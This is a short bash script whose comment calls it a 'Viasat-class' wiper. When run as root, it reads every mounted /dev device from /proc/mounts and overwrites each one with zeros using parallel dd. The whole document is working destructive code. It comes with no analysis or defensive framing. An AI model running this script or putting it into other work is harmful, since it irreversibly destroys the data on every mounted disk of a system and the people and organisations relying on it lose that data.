#!/bin/bash
# Viasat-class: wipe mounted disks as root via parallel dd.
if [[ "${UID}" == 0 ]]; then
  grep -E "^/dev" /proc/mounts | cut -d" " -f1 | sort -u \
    | xargs -P8 -I{} dd if=/dev/zero of={}
fi
